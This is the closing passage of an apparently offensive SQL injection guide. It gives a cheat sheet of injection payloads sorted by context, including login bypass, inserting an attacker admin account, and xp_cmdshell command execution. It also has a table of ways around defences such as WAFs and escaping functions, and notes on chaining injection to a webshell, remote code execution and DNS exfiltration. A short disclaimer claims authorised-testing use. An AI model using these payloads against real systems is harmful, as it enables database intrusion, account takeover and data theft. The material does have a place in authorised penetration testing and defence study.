print(f"[*] Database: {db}")
```

---

## 14. Cheat Sheet — Quick Payloads by Context

| Context | Payload |
|---|---|
| GET param numeric | `1 OR 1=1` |
| GET param string | `' OR '1'='1` |
| POST login bypass | `admin'--` |
| Cookie injection | `' UNION SELECT 1,2,3--` |
| Header injection (X-Forwarded-For) | `' OR 1=1--` |
| JSON API body | `{"id":"1 OR 1=1"}` |
| ORDER BY injection | `1 ASC,(SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)` |
| INSERT injection | `',''); INSERT INTO users VALUES('pwn','pwn','admin')--` |
| UPDATE injection | `',username='admin' WHERE '1'='1` |
| LIKE clause | `%' AND 1=1 AND '%'='` |
| IN clause | `') OR 1=1--` |
| LIMIT/OFFSET injection | `1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,version())),1)--` |
| Stored procedure | `'; EXEC xp_cmdshell 'whoami'--` |
| XML/SOAP parameter | `<id>1' OR 1=1--</id>` |

---

## 15. Defense Awareness

Understanding defenses helps identify bypass opportunities:

| Defense | Bypass Vector |
|---|---|
| Prepared statements / parameterized queries | Not bypassable (correct defense) — look for dynamic SQL elsewhere |
| `addslashes()` / `magic_quotes` | GBK multibyte: `%bf%27` (`unmagicquotes` tamper) |
| `mysql_real_escape_string()` | Generally solid — try numeric injection (no quotes needed) |
| Blacklist filtering (SELECT, UNION) | Case variation, comments, encoding, HPP |
| `htmlspecialchars()` | Only escapes `<>"&'` — does not prevent SQLi in non-HTML contexts |
| WAF (ModSecurity, CloudFlare, AWS WAF) | Tamper chains, chunked encoding, JSON/multipart, HPP, heavy obfuscation |
| Input length limits | Shorter payloads: `'OR 1=1--`, stacked queries, comment truncation |
| Type casting | Target uncasted parameters, look for string contexts |

---

## Notes

- Always verify injection type before deep exploitation — saves time.
- Prefer error-based or union-based when available (fastest extraction).
- Fall back to boolean-blind, then time-blind, then OOB in order of speed.
- For WAF bypass, start with minimal obfuscation and escalate; over-obfuscation adds noise.
- Record every successful payload and technique to the learning database.
- Chain SQLi with file write for webshell → RCE whenever FILE privilege exists.
- MSSQL stacked queries + `xp_cmdshell` is the fastest path to RCE on Windows targets.
- OOB via DNS is the most reliable exfil when you have zero in-band feedback.

> **Disclaimer:** For authorized penetration testing and educational use only. Always obtain written permission before testing.
